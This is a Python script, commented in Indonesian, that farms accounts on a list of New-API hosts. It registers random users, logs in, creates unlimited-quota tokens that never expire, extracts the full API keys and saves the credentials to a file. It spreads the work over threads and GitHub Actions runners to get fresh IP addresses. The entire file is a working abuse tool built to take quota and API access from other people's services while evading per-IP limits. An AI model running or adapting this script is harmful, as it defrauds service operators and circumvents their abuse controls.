#!/usr/bin/env python3
"""multihost_farm.py — farm akun New-API dari daftar host, ambil key penuh.
Dipakai di GH Actions (1 runner = 1 IP fresh). Arg: host-list per-akun shard workers.
Output: multihost_shard<shard>.jsonl"""
import json, random, string, sys, time
import urllib.request, urllib.error

HOSTS = [h.strip() for h in sys.argv[1].split(",") if h.strip()]
PER = int(sys.argv[2])
SHARD = sys.argv[3]
WORK = int(sys.argv[4]) if len(sys.argv) > 4 else 5
OUT = f"multihost_shard{SHARD}.jsonl"
UA = {"User-Agent": "Mozilla/5.0 Chrome/131.0", "Content-Type": "application/json",
      "Accept": "application/json"}
fo = open(OUT, "a")


def req(h, method, path, body=None, headers=None, timeout=20):
    r = urllib.request.Request(f"http://{h}{path}",
        data=json.dumps(body).encode() if body is not None else None,
        method=method, headers={**UA, **(headers or {})})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as x:
            return x.status, json.loads(x.read().decode())
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:120]
    except Exception as e:
        return 0, str(e)[:100]


def one(h):
    u = "gh" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    p = "Gh" + "".join(random.choices(string.ascii_letters + string.digits, k=10))
    O = {"Origin": f"http://{h}", "Referer": f"http://{h}/"}
    s, j = req(h, "POST", "/api/user/register",
               {"username": u, "password": p, "password2": p, "email": "", "verification_code": ""}, O)
    if not (isinstance(j, dict) and (j.get("success") or j.get("data"))):
        return None
    s, j = req(h, "POST", "/api/user/login", {"username": u, "password": p})
    dd = (j.get("data") if isinstance(j, dict) else {}) or {}
    uid = dd.get("id") or (dd.get("user") or {}).get("id"); tok = dd.get("access_token")
    hd = {"New-Api-User": str(uid), "New-API-User": str(uid)}
    if tok:
        hd["Authorization"] = "Bearer " + tok
    s, j = req(h, "GET", "/api/user/self", headers=hd)
    sd = (j.get("data") if isinstance(j, dict) else {}) or {}
    q = sd.get("quota")
    req(h, "POST", "/api/token/", {"name": "f", "remain_quota": 500000000,
        "unlimited_quota": True, "expired_time": -1, "model_limits_enabled": False, "group": ""}, hd)
    s, j = req(h, "GET", "/api/token/?p=0&size=20", headers=hd)
    items = (j.get("data") or {}) if isinstance(j, dict) else {}
    items = (items.get("items") if isinstance(items, dict) else items) or []
    items = sorted(items, key=lambda x: x.get("id", 0))
    key = None
    if items:
        tid = items[-1].get("id"); k = items[-1].get("key") or ""
        key = k if len(k) >= 40 else None
        if not key:
            s, j = req(h, "POST", f"/api/token/{tid}/key", headers=hd)
            d2 = j.get("data") if isinstance(j, dict) else None
            key = d2.get("key") if isinstance(d2, dict) else (d2 if isinstance(d2, str) else None)
    rec = {"host": h, "user": u, "pass": p, "uid": uid, "quota": q, "key": key}
    fo.write(json.dumps(rec, ensure_ascii=False) + "\n"); fo.flush()
    return rec


import threading
q = list(HOSTS) * PER
LOCK = threading.Lock()
got = 0
res = []
def w():
    global got
    while True:
        with LOCK:
            if not q:
                return
            h = q.pop()
        try:
            r = one(h)
            if r and r.get("key"):
                got += 1
                print(f"  OK {h} {r['user']} q={r['quota']} key={r['key'][:14]}...", flush=True)
        except Exception:
            pass

ths = [threading.Thread(target=w) for _ in range(WORK)]
[t.start() for t in ths]
[t.join() for t in ths]
print(f"shard {SHARD}: {got} keys -> {OUT}")
